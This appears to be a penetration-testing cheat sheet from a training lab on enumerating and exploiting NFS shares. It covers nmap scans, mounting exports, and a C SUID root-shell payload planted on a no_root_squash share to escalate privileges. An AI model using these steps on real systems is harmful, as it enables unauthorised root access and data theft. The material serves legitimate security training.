# 111,2049 nfs

 Scan commands
```shell
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

 NSE Scripts
```shell
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

Show available NFS Shares
```shell
showmount -e 10.129.14.128
```

Mount available NFS Share on kali
```shell
vernonlim03@htb[/htb]$ mkdir target-NFS
vernonlim03@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
vernonlim03@htb[/htb]$ cd target-NFS
vernonlim03@htb[/htb]$ tree .
```

Listing of NFS contents
- The owners of the files/folders will be the same as on the NFS Server
- If root_squash in config file is on, backup.sh files cannot be edited on kali even as root
```shell
ls -l mnt/nfs/
ls -n mnt/nfs/
```

##### SUID Binary exploit
- Must have SSH access to the victim machine
- Check /etc/exports on victim machine to see if no_root_squash is enabled

Payload in C
```C
#include <unistd.h>
int main() {
    setuid(0); // Change to root (or target user's UID)
    system("/bin/bash");
    return 0;
}
```

Compile above code and upload to mounted NFS Share and add suid on the binaryu
```bash
gcc shell.c -o shell -static
cp shell /tmp/nfs_mount/
chmod +s /tmp/nfs_mount/shell
```

Login to ssh and run the shell
```bash
/path/to/nfs_share/shell
cat /home/user/secret.txt
```

Default config file on victim machine
```
/etc/exports
```

Unmounting nfs share
```bash
cd ..
sudo umount ./target-NFS
```
